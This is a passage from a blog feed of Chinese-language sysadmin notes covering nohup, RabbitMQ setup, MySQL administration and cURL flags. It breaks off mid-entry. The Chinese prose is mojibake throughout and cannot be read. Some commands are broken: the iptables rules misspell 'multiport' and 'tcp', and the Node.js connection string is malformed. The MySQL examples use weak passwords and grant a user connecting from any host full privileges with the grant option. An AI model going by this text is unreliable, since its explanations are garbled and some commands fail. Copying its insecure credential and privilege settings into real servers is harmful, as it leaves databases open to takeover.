        <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>nohup å‘½ä»¤å¯ä»¥å°†ç¨‹åºä»¥å¿½ç•¥æŒ‚èµ·ä¿¡å·çš„æ–¹å¼è¿è¡Œèµ·æ¥ï¼Œè¢«è¿è¡Œçš„ç¨‹åºçš„è¾“å‡ºä¿¡æ¯å°†ä¸ä¼šæ˜¾ç¤ºåˆ°ç»ˆç«¯ã€‚  </p><p>è¯¥å‘½ä»¤çš„ä¸€èˆ¬å½¢å¼ä¸º<code>nohup command &amp;</code>ã€‚</p><h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup command &gt;/dev/null 2&gt;&amp;1   # doesn&#x27;t create nohup.out</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup command &gt;/dev/null 2&gt;&amp;1 &amp; # runs in background, still doesn&#x27;t create nohup.out</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup command &lt;/dev/null &gt;/dev/null 2&gt;&amp;1 &amp; # completely detached from terminal</span><br></pre></td></tr></table></figure><blockquote><p>è§£é‡Šï¼š<br>å‰é¢çš„ nohup å’Œåé¢çš„ &amp; æˆ‘æƒ³å¤§å®¶éƒ½èƒ½æ˜ç™½äº†æŠŠã€‚<br>ä¸»è¦æ˜¯ä¸­é—´çš„ 2&gt;&amp;1 çš„æ„æ€<br>è¿™ä¸ªæ„æ€æ˜¯æŠŠæ ‡å‡†é”™è¯¯ï¼ˆ2ï¼‰é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºä¸­ï¼ˆ1ï¼‰ï¼Œè€Œæ ‡å‡†è¾“å‡ºåˆå¯¼å…¥æ–‡ä»¶ output é‡Œé¢ï¼Œ<br>æ‰€ä»¥ç»“æœæ˜¯æ ‡å‡†é”™è¯¯å’Œæ ‡å‡†è¾“å‡ºéƒ½å¯¼å…¥æ–‡ä»¶ output é‡Œé¢äº†ã€‚<br>è‡³äºä¸ºä»€ä¹ˆéœ€è¦å°†æ ‡å‡†é”™è¯¯é‡å®šå‘åˆ°æ ‡å‡†è¾“å‡ºçš„åŸå› ï¼Œé‚£å°±å½’ç»“ä¸ºæ ‡å‡†é”™è¯¯æ²¡æœ‰ç¼“å†²åŒºï¼Œè€Œstdoutæœ‰ã€‚<br>è¿™å°±ä¼šå¯¼è‡´ &gt;output 2&gt;output æ–‡ä»¶outputè¢«ä¸¤æ¬¡æ‰“å¼€ï¼Œè€Œstdoutå’Œstderrå°†ä¼šç«äº‰è¦†ç›–ï¼Œè¿™è‚¯å®šä¸æ˜¯æˆ‘é—¨æƒ³è¦çš„ã€‚<br>è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæœ‰äººä¼šå†™æˆï¼š<br>nohup .&#x2F;command.sh &gt;output 2&gt;outputå‡ºé”™çš„åŸå› äº†  </p></blockquote><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://blog.sina.com.cn/s/blog_6c9eaa1501011zml.html">ã€1ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>RabbitMQ</title>
      <link href="/post/rabbitmq.html"/>
      <url>/post/rabbitmq.html</url>
      
        <content type="html"><![CDATA[<h3 id="RabbitMQ"><a href="#RabbitMQ" class="headerlink" title="RabbitMQ"></a>RabbitMQ</h3><h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><p>ç”±äºRabbitMQæ˜¯åŸºäºErlangè¯­è¨€å¼€å‘çš„ï¼Œæ‰€ä»¥è¦ä½¿ç”¨RabbitMQçš„å‰æå½“ç„¶æ˜¯è¦å®‰è£…å…¶è¿è¡Œç¯å¢ƒã€‚  </p><blockquote><p>ä¸åŒç‰ˆæœ¬çš„RabbitMQå¯¹Erlangç‰ˆæœ¬çš„è¦æ±‚ä¸åŒï¼Œå®‰è£…æ—¶éœ€è¦æ³¨æ„</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install erlang</span><br></pre></td></tr></table></figure><p>å®‰è£…RabbitMQ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://www.rabbitmq.com/releases/rabbitmq-server/v3.3.5/rabbitmq-server-3.3.5-1.noarch.rpm</span><br><span class="line"></span><br><span class="line">yum install rabbitmq-server-3.3.5-1.noarch.rpm</span><br></pre></td></tr></table></figure><p>åŠ å…¥å¼€æœºå¯åŠ¨æœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chkconfig rabbitmq-server on</span><br></pre></td></tr></table></figure><p>ç„¶åå¯åŠ¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service rabbitmq-server start</span><br></pre></td></tr></table></figure><p>å¯ç”¨webç®¡ç†<br>æŸ¥çœ‹webç®¡ç†æ˜¯å¦å¯ç”¨ï¼Œè¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmq-plugins list -e</span><br></pre></td></tr></table></figure><p>å¦‚æœæ‰“å°çš„åˆ—è¡¨ä¸­æ²¡æœ‰rabbitmq_managementï¼Œéœ€è¦å¼€å¯è¯¥æ’ä»¶æ‰å¯ä»¥ä½¿ç”¨ï¼Œè¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmq-plugins enable rabbitmq_management</span><br></pre></td></tr></table></figure><p>åˆ›å»ºç”¨æˆ·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqctl delete_user guest # åˆ é™¤guestç”¨æˆ·</span><br><span class="line"></span><br><span class="line">rabbitmqctl add_user admin 123456 # æ·»åŠ ä¸€ä¸ªç”¨æˆ·</span><br><span class="line"></span><br><span class="line">rabbitmqctl set_user_tags admin administrator # æˆäºˆè§’è‰²</span><br><span class="line"></span><br><span class="line">rabbitmqctl set_permissions -p / admin &#x27;.*&#x27; &#x27;.*&#x27; &#x27;.*&#x27; # æˆæƒ</span><br></pre></td></tr></table></figure><p>å¼€æ”¾é˜²ç«å¢™ç«¯å£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p tcp -m multitport --dports 5672,15672 -j ACCEPT</span><br><span class="line">iptables -A OUTPUT -p tpc -m multitport --sports 5672,15672 -j ACCEPT</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="ç®¡ç†å‘½ä»¤"><a href="#ç®¡ç†å‘½ä»¤" class="headerlink" title="ç®¡ç†å‘½ä»¤"></a>ç®¡ç†å‘½ä»¤</h3><h4 id="rabbitmqadmin-cli"><a href="#rabbitmqadmin-cli" class="headerlink" title="rabbitmqadmin-cli"></a>rabbitmqadmin-cli</h4><p>é»˜è®¤æ˜¯æ²¡æœ‰<code>rabbitmqadmin</code>å‘½ä»¤çš„ã€‚é¦–å…ˆå®‰è£…rabbitmqadmin-cli <a href="https://www.rabbitmq.com/management-cli.html">ç‚¹å‡»å»ä¸‹è½½é¡µ</a>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/rabbitmq/rabbitmq-management/rabbitmq_v3_6_10/bin/rabbitmqadmin</span><br></pre></td></tr></table></figure><p>ç„¶åä¿®æ”¹æƒé™<code>chmod +x rabbitmqadmin</code>ï¼Œç§»åŠ¨åˆ°<code>/usr/local/bin</code>ã€‚</p><p>ä½¿ç”¨å®ä¾‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># åˆ—å‡ºæ¥hostä¸‹é¢çš„æ‰€æœ‰exchanges</span><br><span class="line">rabbitmqadmin --username user --password pass --host host -V / list exchanges</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æ–°å£°æ˜ä¸€ä¸ªexchange</span><br><span class="line">rabbitmqadmin declare exchange name=my-new-exchange type=fanout</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># å£°æ˜ä¸€ä¸ªqueue</span><br><span class="line">rabbitmqadmin declare queue name=my-new-queue durable=false</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqadmin declare binding source=my-new-exchange destination=my-new-queue routing_key=routing_key</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rabbitmqadmin delete binding source=my-new-exchange destination=my-new-queue destination_type=queue properties_key=routing_key</span><br></pre></td></tr></table></figure><h4 id="Node-jsä½¿ç”¨RabbitMQ"><a href="#Node-jsä½¿ç”¨RabbitMQ" class="headerlink" title="Node.jsä½¿ç”¨RabbitMQ"></a>Node.jsä½¿ç”¨RabbitMQ</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> q = <span class="string">&#x27;tasks&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> open = <span class="built_in">require</span>(<span class="string">&#x27;amqplib&#x27;</span>).<span class="title function_">connect</span>(<span class="string">&#x27;amqp://admin:12345@#localhost&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Publisher</span></span><br><span class="line">open</span><br><span class="line">    .<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">conn</span>) &#123;</span><br><span class="line">        process.<span class="title function_">once</span>(<span class="string">&#x27;SIGINT&#x27;</span>, conn.<span class="property">close</span>.<span class="title function_">bind</span>(conn));</span><br><span class="line">        <span class="keyword">return</span> conn.<span class="title function_">createChannel</span>();</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">ch</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ch.<span class="title function_">assertQueue</span>(q).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">ok</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ch.<span class="title function_">sendToQueue</span>(q, <span class="keyword">new</span> <span class="title class_">Buffer</span>(<span class="string">&#x27;something to do&#x27;</span>));</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="variable language_">console</span>.<span class="property">warn</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Consumer</span></span><br><span class="line">open</span><br><span class="line">    .<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">conn</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> conn.<span class="title function_">createChannel</span>();</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">ch</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> ch.<span class="title function_">assertQueue</span>(q).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">ok</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> ch.<span class="title function_">consume</span>(q, <span class="keyword">function</span> (<span class="params">msg</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (msg !== <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(msg.<span class="property">content</span>.<span class="title function_">toString</span>());</span><br><span class="line">                    ch.<span class="title function_">ack</span>(msg);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">catch</span>(<span class="variable language_">console</span>.<span class="property">warn</span>);</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.qaulau.com/linux-centos-install-rabbitmq/">ã€1ã€‘</a> <a href="https://my.oschina.net/hncscwc/blog/262246">ã€2ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>socketå¸¸è§é”™è¯¯</title>
      <link href="/post/socket-error.html"/>
      <url>/post/socket-error.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://lzy.iteye.com/blog/383884">ã€1ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MySQL</title>
      <link href="/post/mysql.html"/>
      <url>/post/mysql.html</url>
      
        <content type="html"><![CDATA[<h2 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h2><h3 id="changå¸¸ç”¨å‘½ä»¤"><a href="#changå¸¸ç”¨å‘½ä»¤" class="headerlink" title="changå¸¸ç”¨å‘½ä»¤"></a>changå¸¸ç”¨å‘½ä»¤</h3><ol><li>   æ•°æ®åº“å¤åˆ¶</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump db_1 -uroot -ppassword -h10.0.1.4 --add-drop-table | mysql db_2 -uroot -ppassword -h10.0.1.4</span><br></pre></td></tr></table></figure><blockquote><p>â€“add-drop-table å…ˆåˆ é™¤ååˆ›å»ºè¡¨<br>â€“skip-add-drop-table ç›´æ¥åˆ›å»ºè¡¨<br>â€“skip-extended-insert å¦‚æœè®°å½•å­˜åœ¨åˆ™ä¸æ’å…¥ï¼ˆæ¯æ¡æ•°æ®ä¸€ä¸ªinsertè¯­å¥ï¼‰<br>â€“no-create-info ä¸åˆ›å»ºè¡¨ï¼Œåªå¯¼å…¥<br>â€“lock-tables&#x3D;false ä¸é”è¡¨<br>â€“set-gtid-purged&#x3D;OFF å…¨å±€äº‹ç‰©</p></blockquote><p>import </p><blockquote><p>-f skip-errors</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u [user] -p [db_name] | gzip &gt; [filename_to_compress.sql.gz]</span><br><span class="line">gunzip &lt; [compressed_filename.sql.gz]  | mysql -u [user] -p[password] [databasename]</span><br></pre></td></tr></table></figure><ol start="2"><li>ä¿®æ”¹MySQLç”¨æˆ·å¯†ç å®‰å…¨ç­‰çº§<br><a href="http://www.cnblogs.com/ivictor/p/5142809.html">å‚è€ƒ</a></li></ol><h3 id="å®‰è£…çš„MySQL"><a href="#å®‰è£…çš„MySQL" class="headerlink" title="å®‰è£…çš„MySQL"></a>å®‰è£…çš„MySQL</h3><p><a href="https://dev.mysql.com/doc/refman/5.7/en/linux-installation-yum-repo.html">å‚è€ƒ</a> <a href="http://www.jianshu.com/p/d7b9c468f20d">MySQLåˆ›å»ºç”¨æˆ·ä¸æˆæƒ</a></p><ol><li><p>Adding the MySQL Yum Repository</p><ul><li><p>Go to the Download MySQL Yum Repository page (<a href="http://dev.mysql.com/downloads/repo/yum/">http://dev.mysql.com/downloads/repo/yum/</a>) in the MySQL Developer Zone.</p></li><li><p>Select and download the release package for your platform.<br> CentOS 6</p></li></ul> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://repo.mysql.com/mysql57-community-release-el6-11.noarch.rpm</span><br></pre></td></tr></table></figure><p> CentOS 7<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://dev.mysql.com/get/mysql57-community-release-el7-11.noarch.rpm</span><br></pre></td></tr></table></figure></p><ul><li>Install the downloaded release package with the following command</li></ul> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum localinstall mysql57-community-release-el6-11.noarch.rpm</span><br></pre></td></tr></table></figure> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹é‚£äº› repository æ˜¯å¯ç”¨çŠ¶æ€</span><br><span class="line">yum repolist enabled | grep &quot;mysql.*-community.*&quot;</span><br></pre></td></tr></table></figure></li><li><p>Selecting a Release Series</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum repolist all | grep mysql</span><br></pre></td></tr></table></figure> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># å¯ç”¨ repository</span><br><span class="line">sudo yum-config-manager --disable mysql57-community</span><br><span class="line">sudo yum-config-manager --enable mysql56-community</span><br></pre></td></tr></table></figure></li><li><p>Installing MySQL</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo yum install mysql-community-server</span><br></pre></td></tr></table></figure> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># åªéœ€è¦å®‰è£…å®¢æˆ·ç«¯æ—¶ </span><br><span class="line">sudo yum install mysql-community-client</span><br></pre></td></tr></table></figure></li><li><p>Starting the MySQL Server</p><ul><li>Start the MySQL server</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service mysqld start</span><br></pre></td></tr></table></figure><ul><li>Check the status of the MySQL</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service mysqld status</span><br></pre></td></tr></table></figure><ul><li>Find password for the superuser</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo grep &#x27;temporary password&#x27; /var/log/mysqld.log</span><br></pre></td></tr></table></figure><ul><li>Login &amp; set a custom password</li></ul> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ALTER USER &#x27;root&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &#x27;MyNewPass4!&#x27;;</span><br><span class="line"># OR</span><br><span class="line">SET PASSWORD FOR &#x27;bob&#x27;@&#x27;%.loc.gov&#x27; = PASSWORD(&#x27;newpass&#x27;);</span><br></pre></td></tr></table></figure> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># åˆ›å»ºç”¨æˆ·å¹¶æˆæƒ</span><br><span class="line">CREATE USER &#x27;username&#x27;@&#x27;host&#x27; IDENTIFIED BY &#x27;password&#x27;;</span><br><span class="line">GRANT privileges ON databasename.tablename TO &#x27;username&#x27;@&#x27;host&#x27;</span><br><span class="line"></span><br><span class="line">e.g.</span><br><span class="line">CREATE USER &#x27;pig&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;pig2017&#x27;;</span><br><span class="line">GRANT ALL ON *.* TO &#x27;pig&#x27;@&#x27;%&#x27; WITH GRANT OPTION;</span><br><span class="line">flush privileges;   </span><br></pre></td></tr></table></figure><blockquote><p>æƒé™åˆ—è¡¨ï¼šselectã€deleteã€updateã€createã€dropã€all privileges </p></blockquote> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># å®‰å…¨æ£€æŸ¥ï¼Œä¸»è¦åŒ…æ‹¬å¯†ç æ£€æŸ¥ã€åŒ¿åç”¨æˆ·ã€teståº“ã€rootè¿œç¨‹ç™»å½•</span><br><span class="line">mysql_secure_installation</span><br></pre></td></tr></table></figure></li></ol><blockquote><p>MySQLç¼–è¯‘å®‰è£…å¸¸ç”¨ç¼–è¯‘é€‰é¡¹<br>-DCMAKE_INSTALL_PREFIX&#x3D;&#x2F;usr&#x2F;local&#x2F;mysqlã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€[MySQLå®‰è£…çš„æ ¹ç›®å½•]<br>-DMYSQL_DATADIR&#x3D;&#x2F;mydata&#x2F;mysql&#x2F;dataã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€[MySQLæ•°æ®åº“æ–‡ä»¶å­˜æ”¾ç›®å½•]<br>-DSYSCONFDIR&#x3D;&#x2F;etcã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€[MySQLé…ç½®æ–‡ä»¶æ‰€åœ¨ç›®å½•]<br>-DMYSQL_USER&#x3D;mysqlã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€[MySQLç”¨æˆ·å]<br>-DWITH_MYISAM_STORAGE_ENGINE&#x3D;1ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€[MySQLçš„æ•°æ®åº“å¼•æ“]<br>-DWITH_INNOBASE_STORAGE_ENGINE&#x3D;1ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€[MySQLçš„æ•°æ®åº“å¼•æ“]<br>-DWITH_ARCHIVE_STORAGE_ENGINE&#x3D;1ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€[MySQLçš„æ•°æ®åº“å¼•æ“]<br>-DWITH_MEMORY_STORAGE_ENGINE&#x3D;1ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€[MySQLçš„æ•°æ®åº“å¼•æ“]<br>-DWITH_READLINE&#x3D;1ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€[MySQLçš„readline library,æ‰¹é‡å¯¼å…¥æ•°æ®]<br>-DMYSQL_UNIX_ADDR&#x3D;&#x2F;var&#x2F;run&#x2F;mysql&#x2F;mysql.sockã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€[MySQLçš„é€šè®¯ç›®å½•]<br>-DWITH-LIBWRAP&#x3D;0ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€[æ˜¯å¦æ”¯æŒlibwrap]ã€€<br>-DENABLE_DOWNLOADS&#x3D;1ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€[ç¼–è¯‘æ—¶å…è®¸è‡ªä¸»ä¸‹è½½ç›¸å…³æ–‡ä»¶]<br>-DDEFAULT_CHARSET&#x3D;utf8ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€[è®¾ç½®é»˜è®¤å­—ç¬¦é›†ä¸ºutf8]<br>-DDEFAULT_COLLATION&#x3D;utf8_general_ciã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€ã€€[è®¾ç½®é»˜è®¤æ’åºå­—ç¬¦é›†è§„åˆ™]<br><a href="https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html">https://dev.mysql.com/doc/refman/5.7/en/source-configuration-options.html</a></p></blockquote><h3 id="å¸¸è§é—®é¢˜"><a href="#å¸¸è§é—®é¢˜" class="headerlink" title="å¸¸è§é—®é¢˜"></a>å¸¸è§é—®é¢˜</h3><h4 id="1-mysqldump-Couldnâ€™t-execute-â€˜SHOW-VARIABLES-LIKE-â€˜gtid-modeâ€™â€™-Table-â€˜performance-schema-session-variablesâ€™-doesnâ€™t-exist-1146"><a href="#1-mysqldump-Couldnâ€™t-execute-â€˜SHOW-VARIABLES-LIKE-â€˜gtid-modeâ€™â€™-Table-â€˜performance-schema-session-variablesâ€™-doesnâ€™t-exist-1146" class="headerlink" title="1. mysqldump: Couldnâ€™t execute â€˜SHOW VARIABLES LIKE â€˜gtid_modeâ€™â€™: Table â€˜performance_schema.session_variablesâ€™ doesnâ€™t exist (1146)"></a>1. mysqldump: Couldnâ€™t execute â€˜SHOW VARIABLES LIKE â€˜gtid_modeâ€™â€™: Table â€˜performance_schema.session_variablesâ€™ doesnâ€™t exist (1146)</h4><p>å…ˆåœæ­¢æ•°æ®åº“ï¼Œç„¶åè¿è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_upgrade -u root -p --force</span><br></pre></td></tr></table></figure><p>é‡å¯æœåŠ¡</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>cURL</title>
      <link href="/post/curl.html"/>
      <url>/post/curl.html</url>
      
        <content type="html"><![CDATA[<h2 id="cURL"><a href="#cURL" class="headerlink" title="cURL"></a>cURL</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">-X/--request [GET|POST|PUT|DELETE|â€¦]  ä½¿ç”¨æŒ‡å®šçš„http methodå‘å‡º http request</span><br><span class="line">-H/--header                           è®¾ç½®requesté‡Œçš„header</span><br><span class="line">-i/--include                          æ˜¾ç¤ºresponseçš„header</span><br><span class="line">-d/--data                             è®¾ç½® http parameters </span><br><span class="line">-v/--verbose                          å°å†™çš„vå‚æ•°ï¼Œç”¨äºæ‰“å°æ›´å¤šä¿¡æ¯ï¼ŒåŒ…æ‹¬å‘é€çš„è¯·æ±‚ä¿¡æ¯ï¼Œè¿™åœ¨è°ƒè¯•è„šæœ¬æ˜¯ç‰¹åˆ«æœ‰ç”¨ã€‚</span><br><span class="line">-u/--user                             ä½¿ç”¨è€…è´¦å·ã€å¯†ç </span><br><span class="line">-b/--cookie                           cookie  </span><br><span class="line">-s/--slient                           å‡å°‘è¾“å‡ºçš„ä¿¡æ¯ï¼Œæ¯”å¦‚è¿›åº¦</span><br><span class="line">-o/--output &lt;file&gt;                    æŒ‡å®šè¾“å‡ºæ–‡ä»¶åç§°</span><br><span class="line">-e/--referer                          &lt;URL&gt; æŒ‡å®šå¼•ç”¨åœ°å€</span><br><span class="line">-L                                    é‡å®šå‘</span><br><span class="line"></span><br><span class="line">--resolve HOST:PORT:ADDRESS           è®¾ç½®è§£æåœ°å€</span><br><span class="line">--retry 